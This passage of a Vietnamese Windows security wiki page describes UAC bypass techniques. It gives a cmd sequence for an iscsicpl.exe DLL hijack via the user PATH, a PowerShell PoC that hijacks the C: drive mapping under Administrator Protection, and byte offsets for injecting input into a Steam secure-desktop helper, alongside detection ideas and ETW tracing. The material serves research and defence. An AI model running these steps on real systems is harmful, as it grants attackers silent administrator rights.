### Một kỹ thuật UAC bypass khác

Kỹ thuật này bao gồm việc theo dõi xem một **binary autoElevated** có cố **đọc** từ **registry** **tên/đường dẫn** của một **binary** hoặc **command** sẽ được **thực thi** hay không (điều này đáng chú ý hơn nếu binary tìm thông tin đó trong **HKCU**).

### UAC bypass qua `SysWOW64\iscsicpl.exe` + DLL hijack bằng `PATH` của user

`C:\Windows\SysWOW64\iscsicpl.exe` 32-bit là một binary **auto-elevated** có thể bị khai thác để tải `iscsiexe.dll` theo thứ tự tìm kiếm. Nếu có thể đặt một `iscsiexe.dll` độc hại trong một thư mục **user-writable**, sau đó sửa `PATH` của user hiện tại (ví dụ qua `HKCU\Environment\Path`) để Windows tìm kiếm thư mục đó, Windows có thể tải DLL của attacker vào process `iscsicpl.exe` đã được nâng quyền **mà không hiển thị lời nhắc UAC**.<sup>[[1]](#references)[[6]](#references)</sup>

Lưu ý thực tế:
- Cách này hữu ích khi user hiện tại thuộc nhóm **Administrators** nhưng đang chạy ở mức **Medium Integrity** do UAC.
- Bản **SysWOW64** là bản liên quan đến UAC bypass này. Hãy xem bản **System32** là một binary riêng và tự xác minh hành vi của nó.
- Primitive này kết hợp **auto-elevation** và **DLL search-order hijacking**, vì vậy quy trình ProcMon được dùng cho các UAC bypass khác cũng hữu ích để xác minh việc tải DLL bị thiếu.

Quy trình tối thiểu:

```cmd
copy iscsiexe.dll %TEMP%\iscsiexe.dll
reg add "HKCU\Environment" /v Path /t REG_SZ /d "%TEMP%" /f
C:\Windows\System32\cmd.exe /c C:\Windows\SysWOW64\iscsicpl.exe
```

Ý tưởng phát hiện:
- Cảnh báo khi có `reg add` / thao tác ghi registry vào `HKCU\Environment\Path`, ngay sau đó là thực thi `C:\Windows\SysWOW64\iscsicpl.exe`.
- Tìm `iscsiexe.dll` trong các vị trí **do người dùng kiểm soát**, chẳng hạn `%TEMP%` hoặc `%LOCALAPPDATA%\Microsoft\WindowsApps`.
- Đối chiếu các lần chạy `iscsicpl.exe` với tiến trình con bất thường hoặc việc tải DLL từ ngoài các thư mục Windows thông thường.

### Nghiên cứu mới hơn cần kiểm tra riêng

Một số chuỗi khai thác sau năm 2024 không còn giống các vụ chiếm quyền registry `HKCU\Software\Classes` cổ điển. Ví dụ, activation-context cache poisoning có thể kết hợp **drive remap** và **DLL redirection** để chuyển từ mức toàn vẹn trung bình lên cao thông qua các binary giao diện đáng tin cậy / tự động nâng quyền như `ctfmon.exe` và các mục tiêu tiếp theo như `fodhelper.exe`. Thay vì sao chép PoC lớn vào đây, hãy xem các ví dụ payload ngắn gọn tại:

{{#ref}}
../windows-local-privilege-escalation/windows-c-payloads.md
{{#endref}}

### Chiếm quyền ký tự ổ đĩa Administrator Protection (preview) thông qua ánh xạ thiết bị DOS theo từng phiên đăng nhập

> [!NOTE]
> Tính đến tháng 8 năm 2026, Microsoft vẫn ghi nhận Administrator Protection là bản **Insider preview**: đợt triển khai vào tháng 10 năm 2025 đã bị thu hồi và được lên kế hoạch phát hành vào một thời điểm sau đó. Trước khi kiểm thử các chuỗi khai thác này, hãy xác nhận **Admin Approval Mode with Administrator protection** thực sự được bật và thiết bị đã được khởi động lại; chỉ riêng chuỗi phiên bản 25H2 mặc định không chứng minh tính năng đang hoạt động.<sup>[[10]](#references)</sup>

Để xem toàn bộ bề mặt tấn công `RAiLaunchAdminProcess` / UIAccess trên các bản dựng preview Windows 11 25H2, hãy xem trang chuyên biệt:

{{#ref}}
../windows-local-privilege-escalation/uiaccess-admin-protection-bypass.md
{{#endref}}

“Administrator Protection” của Windows 11 25H2 sử dụng shadow-admin tokens với các ánh xạ `\Sessions\0\DosDevices/<LUID>` theo từng phiên. Thư mục này được `SeGetTokenDeviceMap` tạo theo nhu cầu trong lần phân giải `\??` đầu tiên. Nếu kẻ tấn công mạo danh shadow-admin token chỉ ở mức **SecurityIdentification**, thư mục sẽ được tạo với kẻ tấn công là **chủ sở hữu** (kế thừa `CREATOR OWNER`), cho phép các liên kết ký tự ổ đĩa được ưu tiên hơn `\GLOBAL??`.<sup>[[7]](#references)</sup>

**Các bước:**

1. Từ một phiên có quyền thấp, gọi `RAiProcessRunOnce` để chạy `runonce.exe` dưới quyền shadow-admin mà không hiện lời nhắc.
2. Sao chép primary token của tiến trình thành một **identification token** rồi mạo danh token đó trong khi mở `\??` để buộc tạo `\Sessions\0\DosDevices/<LUID>` dưới quyền sở hữu của kẻ tấn công.
3. Tạo một symlink `C:` tại đó trỏ đến vùng lưu trữ do kẻ tấn công kiểm soát; các lần truy cập hệ thống tệp tiếp theo trong phiên đó sẽ phân giải `C:` thành đường dẫn của kẻ tấn công, cho phép chiếm quyền DLL/file mà không cần lời nhắc.

**PoC PowerShell (NtObjectManager):**
```powershell
$pid = Invoke-RAiProcessRunOnce
$p = Get-Process -Id $pid
$t = Get-NtToken -Process $p
$id = New-NtTokenDuplicate -Token $t -ImpersonationLevel Identification
Invoke-NtToken $id -ImpersonationLevel Identification { Get-NtDirectory "\??" | Out-Null }
$auth = Get-NtTokenId -Authentication -Token $id
New-NtSymbolicLink "\Sessions\0\DosDevices/$auth/C:" "\??\\C:\\Users\\attacker\\loot"
```

Trên các máy preview, Administrator Protection ghi lại các lần phê duyệt và thất bại dưới dạng sự kiện ETW **15031** và **15032** trong provider `Microsoft-Windows-LUA`. Các sự kiện bao gồm SID của người yêu cầu, đường dẫn ứng dụng, kết quả, tài khoản quản trị viên được quản lý và phương thức xác thực, vì vậy các lần thử khai thác lặp lại hoặc điều khiển UI thất bại đều được ghi nhận trong telemetry.<sup>[[10]](#references)</sup>

```cmd
logman start AdminProtectionTrace -p {93c05d69-51a3-485e-877f-1806a8731346} -ets
rem reproduce the elevation attempt
logman stop AdminProtectionTrace -ets
```



### Input trên secure desktop được chuyển tiếp qua shared-memory ring có quyền ghi

Một helper trên secure desktop có thể làm suy yếu UAC prompt nếu người dùng có integrity level trung bình ghi được vào IPC đầu vào của nó. Trong thiết kế Steam được báo cáo, `IClientSecureDesktop::BStartStreaming` khởi chạy `secure_desktop_capture.exe` dưới quyền SYSTEM trên `winsta0\winlogon`. Nó cung cấp `Global\SecureDesktopInput_mem-IPCWrapper` với quyền truy cập `GENERIC_ALL` cho người dùng; helper đọc các mục trong ring và gọi `SendInput` trên secure desktop. Cơ chế này khác với UIAccess hoặc thay đổi `PromptOnSecureDesktop`: đầu vào được chuyển tiếp bởi một process vốn đã chạy trên đó. Xem [service IPC bootstrap](../windows-local-privilege-escalation/abusing-auto-updaters-and-ipc.md#shared-memory-bootstrap-into-privileged-service-ipc) để biết cách client gọi handler này. <sup>[[15]](#references)[[16]](#references)</sup>

Ring có 128 slot, mỗi slot dài 173 byte. Bộ đếm ghi và đọc nằm tại `0x414` và `0x418`; slot `N` nằm tại `0x41c + 173*N`. Đặt byte đầu tiên của slot thành `0` để chỉ dữ liệu plaintext, sao chép một Windows `INPUT` dài 40 byte ngay sau đó, rồi tăng bộ đếm ghi. Với administrator có integrity level trung bình đang thấy consent prompt, nhấn phím `Y` xuống rồi nhả có thể kích hoạt nút xác nhận UAC sau khi khởi chạy executable yêu cầu nâng quyền; thao tác này không thể trả lời credential prompt dành cho standard user. **Consent gate vẫn có tác dụng**: helper chỉ chuyển tiếp đầu vào sau khi người dùng chấp thuận prompt `InputEnabled` cho thời hạn ủy quyền hiện tại là 90 ngày. Chỉ có mapping cho phép đọc/ghi không chứng minh được rằng đầu vào đến được prompt; hãy so sánh bộ đếm đọc trước và sau một phép thử có kiểm soát. <sup>[[15]](#references)[[16]](#references)</sup>

## References

- [1] [LOLBAS: Iscsicpl.exe](https://lolbas-project.github.io/lolbas/Binaries/Iscsicpl/)
- [2] [Microsoft Docs – Cách User Account Control hoạt động](https://learn.microsoft.com/windows/security/identity-protection/user-account-control/how-user-account-control-works)
- [3] [UACME – Bộ sưu tập kỹ thuật bypass UAC](https://github.com/hfiref0x/UACME)
- [4] [WinPwnage – Công cụ quét khả năng tương thích và khởi chạy UAC bypass](https://github.com/rootm0s/WinPwnage)
- [5] [Checkpoint Research – KONNI sử dụng AI để tạo PowerShell backdoor](https://research.checkpoint.com/2026/konni-targets-developers-with-ai-malware/)
- [6] [Check Point Research – Operation TrueChaos: Khai thác 0-Day nhắm vào các mục tiêu chính phủ Đông Nam Á](https://research.checkpoint.com/2026/operation-truechaos-0-day-exploitation-against-southeast-asian-government-targets/)
- [7] [Project Zero – Bypass Windows Administrator Protection](https://projectzero.google/2026/26/windows-administrator-protection.html)
- [8] [Sigma / Detection.FYI – Bypass UAC bằng tác vụ SilentCleanup](https://detection.fyi/sigmahq/sigma/windows/registry/registry_set/registry_set_bypass_uac_using_silentcleanup_task/)
- [9] [R41N3RZUF477 – Các bypass UnifiedConsent, TabTip và Narrator Always Notify](https://github.com/hfiref0x/UACME/issues/173)
- [10] [Microsoft Learn – Administrator protection](https://learn.microsoft.com/en-us/windows/security/application-security/application-control/administrator-protection/)
- [11] [Google Project Zero – Gọi Local Windows RPC Server từ .NET](https://projectzero.google/2019/12/calling-local-windows-rpc-servers-from.html)
- [12] [Kaspersky Securelist – HoneyMyte nâng cấp CoolClient bằng Windows kernel rootkit có chữ ký](https://securelist.com/honeymyte-coolclient-driver-rootkit/121028)
- [13] [Group-IB – KGB RAT: Trojan Windows hoàn toàn không thể phát hiện, được tạo ra để theo dõi, đánh cắp và khủng bố](https://www.group-ib.com/blog/kgb-rat-windows-fud-trojan/)
- [14] [LOLBAS – ComputerDefaults.exe](https://lolbas-project.github.io/lolbas/Binaries/ComputerDefaults/)
- [15] [Atredis – Turning the Valve](https://atredis.com/blog/2026/10/28/turning-the-valve)
- [16] [Atredis – PoC của Turning the Valve](https://github.com/atredispartners/proof-of-concept/tree/main/turning-the-valve/code)
